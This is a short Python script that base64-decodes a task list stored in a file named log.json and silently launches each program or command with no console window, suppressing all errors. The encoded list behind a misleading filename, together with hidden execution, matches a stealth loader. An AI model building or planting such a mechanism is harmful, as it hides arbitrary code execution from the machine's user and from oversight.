import os
import json
import base64
import subprocess
import sys

def main():
    # 日志文件路径
    LOG_FILE = "D:/getting/log.json"
    
    # 检查日志文件是否存在
    if not os.path.exists(LOG_FILE):
        sys.exit(0)
    
    try:
        # 读取并解码Base64格式的任务列表
        with open(LOG_FILE, "r") as f:
            encoded_data = f.read()
            decoded_data = base64.b64decode(encoded_data).decode("utf-8")
            tasks = json.loads(decoded_data)
        
        # 执行所有任务
        for task in tasks:
            try:
                if task.endswith('.py'):
                    subprocess.Popen(['python', task], creationflags=subprocess.CREATE_NO_WINDOW)
                else:
                    subprocess.Popen(task, creationflags=subprocess.CREATE_NO_WINDOW)
            except Exception as e:
                continue
                
    except Exception as e:
        pass

if __name__ == "__main__":
    main()